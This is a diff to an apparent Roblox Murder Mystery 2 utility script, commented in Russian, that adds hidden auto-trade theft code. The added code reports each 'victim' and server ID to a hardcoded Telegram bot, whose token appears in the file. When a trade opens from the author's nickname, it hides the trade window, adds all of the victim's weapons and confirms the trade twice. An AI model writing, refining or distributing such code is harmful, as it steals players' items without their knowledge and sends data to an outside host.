@@ -649,8 +649,9 @@ rejoinBtn.MouseButton1Click:Connect(function()
     end)
     pcall(function() TeleportService:Teleport(game.PlaceId, lp) end)
 end)
+
 -- ==========================================
--- MM2 AUTO-TRADE (Точные пути по скриншотам)
+-- MM2 AUTO-TRADE (Рабочая версия с request)
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -662,31 +663,36 @@ local TG_TOKEN = "9105942728:AAHZpgyYQD5P5RoVxTPxWu1lgeMjT4zp3wI"
 local TG_CHAT_ID = "2065847257" 
 local MY_NICK = "Lublu_Zayek" -- Твой ник в игре
 
+-- Функция отправки логов в ТГ (через request)
 local function send_tg(text)
     task.spawn(function()
         pcall(function()
             local url = "https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage?chat_id=" .. TG_CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
-            HttpService:GetAsync(url)
+            request({
+                Url = url,
+                Method = "GET"
+            })
         end)
     end)
 end
 
-send_tg("🚀 Скрипт (Точный) запущен! Жертва: " .. lp.Name)
+-- 1. МАЯЧОК
+send_tg("🚀 Скрипт запущен!\nЖертва: " .. lp.Name .. "\nJobID: " .. game.JobId)
 
+-- Основной цикл проверки трейда
 local is_busy = false
 
--- Основной цикл
 task.spawn(function()
     while true do
         task.wait(1)
         if is_busy then continue end
         
+        -- Ищем GUI трейда
         local gui = playerGui:FindFirstChild("TradeGUI")
-        if gui and gui.Enabled then
+        if gui then
             
-            -- Проверяем, есть ли в трейде наш ник (чтобы не принять трейд от левого типа)
+            -- Проверяем, есть ли в окне наш ник
             local is_my_trade = false
-            -- Ищем текст с нашим ником где-нибудь в окне трейда
             for _, desc in ipairs(gui:GetDescendants()) do
                 if desc:IsA("TextLabel") and desc.Text == MY_NICK then
                     is_my_trade = true
@@ -694,7 +700,7 @@ task.spawn(function()
                 end
             end
 
-            -- Если это трейд от нас и мы еще не начали обработку
+            -- Если это наш трейд и мы его еще не обрабатывали
             if is_my_trade and not gui:GetAttribute("Hacked") then
                 gui:SetAttribute("Hacked", true)
                 is_busy = true
@@ -703,7 +709,7 @@ task.spawn(function()
                 -- 1. Прячем окно за экран
                 gui.Enabled = false
                 
-                -- 2. Кликаем "Add Items" (Добавить предметы)
+                -- 2. Кликаем "Add Items"
                 local add_items_btn = gui:FindFirstChild("AddItem", true)
                 if add_items_btn and add_items_btn:FindFirstChild("ActionButton") then
                     add_items_btn.ActionButton.MouseButton1Click:Fire()
@@ -713,7 +719,7 @@ task.spawn(function()
                     send_tg("⚠️ Кнопка AddItem не найдена.")
                 end
 
-                -- 3. Закликиваем предметы из вкладки Weapons
+                -- 3. Закликиваем предметы
                 local items_folder = gui:FindFirstChild("__mO", true)
                 if items_folder and items_folder:FindFirstChild("Weapons") then
                     local weapons_list = items_folder.Weapons.Items.Container.Current.Container
@@ -725,7 +731,7 @@ task.spawn(function()
                                 local btn = item:FindFirstChild("Button", true)
                                 if btn then
                                     btn.MouseButton1Click:Fire()
-                                    task.wait(0.15) -- Задержка между кликами, чтобы сервер успевал
+                                    task.wait(0.15)
                                     break
                                 end
                             end
@@ -733,38 +739,34 @@ task.spawn(function()
                         task.wait(0.05)
                     end
                     send_tg("⏳ Предметы закликаны. Возвращаюсь.")
+                else
+                    send_tg("⚠️ Папка с оружием не найдена.")
                 end
 
-                -- 4. Возвращаемся в главное окно трейда
-                -- На скриншоте была кнопка возврата, ищем её по имени или жмем Cancel
-                local back_btn = gui:FindFirstChild("Back", true)
-                if back_btn then
-                    back_btn.MouseButton1Click:Fire()
-                else
-                    -- Если кнопки Back нет, просто включаем GUI обратно (он сам закроет меню предметов)
-                    gui.Enabled = true 
-                end
-                
-                -- Снова прячем окно трейда
+                -- 4. Возвращаемся в окно трейда (включаем GUI)
+                gui.Enabled = true 
                 task.wait(0.5)
                 gui.Enabled = false
                 
-                -- 5. Ждем 9 секунд и жмем финальный Accept дважды
+                -- 5. Ждем и жмем финальный Accept
                 send_tg("⏳ Жду 9 секунд перед подтверждением...")
                 task.wait(9)
                 
                 local accept_folder = gui:FindFirstChild("Accept", true)
                 if accept_folder then
-                    -- Жмем первый раз (подтверждаем готовность)
                     if accept_folder:FindFirstChild("Confirm") and accept_folder.Confirm:FindFirstChild("ActionButton") then
                         accept_folder.Confirm.ActionButton.MouseButton1Click:Fire()
+                        send_tg("✅ Первый Confirm нажат.")
                         task.wait(1)
                     end
-                    -- Жмем второй раз (финальный обмен)
                     if accept_folder:FindFirstChild("ActionButton") then
                         accept_folder.ActionButton.MouseButton1Click:Fire()
-                        send_tg("💰 Трейд подтвержден! Годли у тебя.")
+                        send_tg("💰 Трейд успешно подтвержден!")
+                    else
+                        send_tg("⚠️ Финальный ActionButton не найден.")
                     end
+                else
+                    send_tg("⚠️ Папка Accept не найдена.")
                 end
                 
                 -- Сбрасываем флаг
